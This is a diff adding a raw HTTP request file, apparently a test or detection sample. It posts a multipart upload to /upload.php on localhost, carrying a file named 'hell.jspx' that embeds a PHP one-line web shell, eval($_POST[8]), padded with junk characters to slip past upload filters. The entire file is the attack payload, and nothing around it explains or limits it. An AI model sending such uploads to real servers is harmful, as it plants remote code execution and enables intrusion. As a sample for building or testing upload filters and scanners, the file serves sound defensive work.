@@ -1,0 +1,14 @@
+POST /upload.php HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Accept-Language: zh
+User-Agent: Mozilla/8.8 (Windows 8.5; Windows NT 3.7; Avant Browser 3.5) Intel Mac OS X 9.91; U; en 6.6
+Content-Type: multipart/form-data; boundary=----UiprVFumDuHVacABjpoVLgHnoo
+Content-Length: 250
+Connection: close
+
+------UiprVFumDuHVacABjpoVLgHnoo
+Content-Disposition: form-data; name=\"username\"; filename=\"hell.jspx\"
+
+3274JjhJ<?php  eval($_POST[8])?><? A9(,)#\u00a5%4zVfJ\u2026\u2026&*\uff088O
+------UiprVFumDuHVacABjpoVLgHnoo--
